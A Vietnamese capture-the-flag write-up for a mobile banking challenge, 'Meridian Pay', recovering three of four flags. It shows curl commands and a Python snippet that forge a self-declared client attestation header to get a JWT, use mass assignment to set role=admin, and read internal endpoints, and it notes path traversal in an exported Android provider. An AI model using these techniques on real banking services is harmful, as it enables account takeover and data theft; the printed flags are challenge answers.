# Meridian Pay — Mobile (Hard)

**Flag:** Thu thập được ba trong tổng số bốn cờ (objective)
**File cung cấp:** `meridian-pay-3.2.1.apk.zip`, 12771 B (bung nén ra file APK 16885 B, mã băm sha256 `447c3cd07770cfd78c6601f9076167208e5b670f3708be085cb69d08f741efa1`)
**Dịch vụ:** `https://web-3f25599ac74e8a91.web.h7tex.com`

```text
Cờ v1: H7CTF{474de245-b63a-4fc0-b9f8-b7dec75e0f27}
Cờ v2: H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}
Cờ v4: H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}
Cờ v3: Chưa giải cứu được
```

## Đề bài

Hệ thống đưa ta vào thử thách của một ngân hàng số (neobank) với triết lý phát triển thảm hoạ: "Vội vàng đưa lên chợ và tin tưởng tất cả mọi người". Ứng dụng tin tưởng máy chủ vô điều kiện, máy chủ nhắm mắt tin tưởng ứng dụng, và cả hai cùng ngây ngô tin tưởng cái điện thoại đang chạy bên dưới nó. 
Tác giả gợi ý có 4 lỗ hổng riêng biệt rải rác khắp ứng dụng và tầng API phía sau; mỗi lỗ hổng giấu một lá cờ. Hệ thống cấp cho ta một file APK siêu nhẹ (12.5 KB) và một địa chỉ HTTP. 4 mục tiêu này là độc lập, không cần giải bài này làm tiền đề cho bài kia.

## Phân tích ban đầu

Kích thước của file APK nhỏ đến mức bất thường. Mổ bụng nó ra, chỉ lèo tèo vài tệp cơ bản: `AndroidManifest.xml`, cuộn mã `classes.dex` nặng 13.776 B, file tài nguyên `resources.arsc` 1100 B, một bản vẽ giao diện (layout) và thư mục chữ ký `META-INF/`. Hoàn toàn không có bóng dáng của các thư viện nhúng (lib) hay tài nguyên media (asset). Dấu vết biên dịch (build) cho thấy nó được nặn ra từ trình D8 ở chế độ gỡ lỗi (`compilation-mode=debug`) với mục tiêu `min-api=24`.

Chạy lệnh `strings` để quét chuỗi văn bản trên cuộn mã dex, ta hốt trọn toàn bộ các manh mối cần thiết: `/api/v1/auth/device`, `/api/v1/promo/public`, `/files/`, `device_id`, `seedReceipts`, `val$ftoken`, `Authenticating device...`. 
Tuy nhiên, thông tin đắt giá nhất lại đến từ thứ... KHÔNG HIỆN DIỆN: Không hề có bất kỳ chuỗi `H7CTF{` nào giấu trong tệp. Bắt bệnh ngay: Các lá cờ đều nằm trên máy chủ (server), còn file APK này chỉ đóng vai trò như một tờ giấy hướng dẫn sử dụng (tài liệu).

Dịch ngược mã nguồn bằng công cụ `androguard` để rọi đèn vào bụng các hàm. Ngay lập tức, lộ diện 3 "tử huyệt niềm tin" (trust) đúng như lời tác giả úp mở:

- Lớp `ApiClient` ngang nhiên đóng cứng (hardcode) đoạn mào đầu (header): `X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)`. Kinh hoàng hơn, máy chủ lại dùng đúng cái dòng chữ rẻ tiền đó làm "giấy chứng nhận" thiết bị hợp lệ. Tức là client thích xưng danh thế nào thì xưng, miễn tự khai "attested" là qua cửa.
- Phương thức `Session.setBaseUrl(...)` nhai sống (lấy thẳng) chuỗi ký tự mà người dùng gõ trên giao diện UI. Kế đó, hoạt động `RouterActivity` lại há miệng chờ đón đường link nội bộ (deep link) `?url=` và vô tư ghi đè cái link mờ ám đó thẳng vào bộ lưu trữ SharedPreferences.
- Provider `ExportProvider` là một kênh cung cấp dữ liệu mở hớ hênh (exported). Đường dẫn lưu chuyển bên trong nó chui qua hàm `new File(receiptsDir, path.substring(7))` mà không hề thèm cắm bộ lọc chặn trò chọc ngoáy thư mục `..` (Directory Traversal). Thêm nữa, đoạn `seedReceipts` lại có khả năng ghi thẳng dữ liệu xuống vùng `files/`.

Chiến thuật tổng lực: Triệu hồi API y đúc cái cách mà cái app què quặt này đang làm, sau đó xé toạc hai lỗ hổng niềm tin ngớ ngẩn của máy chủ: thứ nhất là việc nó tin vào cái header tự khai; thứ hai là việc nó nuốt chửng phần thân (body) của luồng gửi `PATCH /api/v1/profile` mà không có màng lọc kiểm duyệt.

## Chuỗi khai thác

**Bước 1 - Lừa đảo đoạt vé Bearer bằng header của app.** 
Thử nã lệnh `POST /api/v1/auth/device` theo cách thông thường, máy chủ lập tức từ chối vì thiếu header chuyên dụng:

```bash
curl -sk -X POST $U/api/v1/auth/device -H 'Content-Type: application/json' \
     -d '{"device_id":"probe-1"}'
```

```json
{"error":"client attestation required"}
```

Giải pháp đơn giản đến buồn cười: Chỉ việc nhồi cái header mà app đang dùng vào, còn trường `device_id` thì chế bừa là gì cũng lọt:

```bash
curl -sk -X POST $U/api/v1/auth/device \
     -H 'X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)' \
     -H 'Content-Type: application/json' -d '{"device_id":"probe-1"}'
```

Máy chủ trả về mã 200 kèm chiếc chìa khoá `token`. Chìa khoá này là một chuỗi JWT mã hoá theo chuẩn HS256, mổ ruột ra (payload) thấy có ghi `{"sub":"1001",...}`. Vậy là máy chủ sẵn sàng cấp thẻ vào cửa (bearer) của thành viên số 1001 cho bất cứ ai biết cách gõ đúng câu thần chú ngụy trang client.

**Bước 2 - Vớt cờ v1.** 
Cổng `promo/public` là một trang mở công khai, bản thân nó đã trưng sẵn bảng chỉ đường tới tận hang ổ:

```html
<p>Enrolled members can finish loyalty sign-up in the app: <a href="/api/v1/internal/promo">complete enrollment</a>.</p>
```

Quất thẳng vào cổng `/api/v1/internal/promo`, kẹp thêm cái header ngụy trang và tấm vé bearer vừa ăn cắp được:

```text
200  180  <html><body><h3>Meridian Pay - Loyalty Enrollment</h3><p>Welcome back, member 1001. Enrollment confirmation:</p><pre>H7CTF{474de245-b63a-4fc
```

**Bước 3 - Cướp quyền admin đoạt cờ v2, thông qua lỗ hổng Mass Assignment.** 
Cổng `PATCH /api/v1/profile` ngây thơ lưu thẳng cẳng toàn bộ những gì mà luồng body gửi lên, bao gồm cả trường phân quyền `role` (hệ thống cho phép ghi đè các cột `email`/`name`/`role`/`tier`). Thừa nước đục thả câu, ta tiêm đoạn `role=admin` và đàng hoàng vác sổ cái (ledger) ra đọc:

```python
req("/api/v1/profile", "PATCH", {"role": "admin"}, hdr=A)
print(req("/api/v1/admin/ledger", hdr=A))
```

```text
200  152  {"corporate_master_key_rotation":"H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}","generated":"2026-09-24","note":"admin-only consolidated ledg
```

Thực nghiệm cho thấy: Nếu truy cập đường dẫn trên trước khi tráo vai trò (role), máy chủ sẽ lạnh lùng gạt đi: `{"error":"admin role required"}`.

**Bước 4 - Vớt cờ v4.** 
Cũng dùng chính tấm vé bearer đó, ta gõ cửa cổng `/api/v1/accounts/me`:

```text
1) accounts/me: 200 {"account":{"balance_cents":418233,"memo":"personal checking","number":"MP-0041-8827",
"owner":1001,"type":"checking"},"onboarding_memo":"session verified from device -
H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}","user_id":1001}
```

Trường `onboarding_memo` trào ra lá cờ, nguyên do bởi máy chủ đinh ninh rằng việc "xưng đúng header của app" chính là bảo chứng sắt đá cho việc phiên làm việc (session) đã được kiểm định trên thiết bị. 
Nói thêm về phía client (thiết bị), sự thật là có những rò rỉ ngớ ngẩn làm lộ cả phiên: chuỗi mã JWT được cất trong bộ nhớ SharedPreferences dưới dạng chữ nổi (plaintext) không che chắn, và anh bạn `ExportProvider` thì lại cho phép lôi nó ra ngoài do đường dẫn không cắm màng lọc `..`.

**Bước 5 - Rà soát và đối chiếu.** 
Trước khi gửi bài nộp mộc, một vòng rà soát lại toàn bộ từ A đến Z được tiến hành: Kéo một thẻ token mới toanh, đâm thẳng vào 3 cánh cửa API trên. Cả 3 cờ nôn ra y đúc. Suốt quá trình rà soát, dẫu trường `tier` đã bị chỉnh đi chỉnh lại tới 7 giá trị khác nhau làm biến dạng cái profile, máy chủ vẫn chỉ ói ra 3 lá cờ đó chứ không đẻ thêm cờ ẩn nào cả.

## Flag
```bash
python exploit.py https://web-3f25599ac74e8a91.web.h7tex.com
```

Kết quả:
```text
v1 /api/v1/internal/promo   H7CTF{474de245-b63a-4fc0-b9f8-b7dec75e0f27}
v2 /api/v1/admin/ledger     H7CTF{fc3b3bd4-7fc2-4679-8150-9d0ce062c50b}
v4 /api/v1/accounts/me      H7CTF{2e58befc-e322-4563-83ae-2f1c00a0277f}
v3 - Vẫn bặt vô âm tín, mức độ hoàn thành 5/… solves
```

Sau lần công phá đó, thời gian mượn xác (session 45 phút) đã cạn, máy chủ đóng sập lại. Ba lá cờ trên là thành quả rực rỡ từ việc tự chạy và đối chứng chéo trên chính instance. Mảng ghi chép này không ôm đồm việc phán xét xem hệ thống của ban tổ chức đã nhận cờ thế nào. Nhiệm vụ cờ v3 vẫn đang dở dang với 2 hướng điều tra tiềm năng bị vứt lại ở cuối trang `notes.md`.
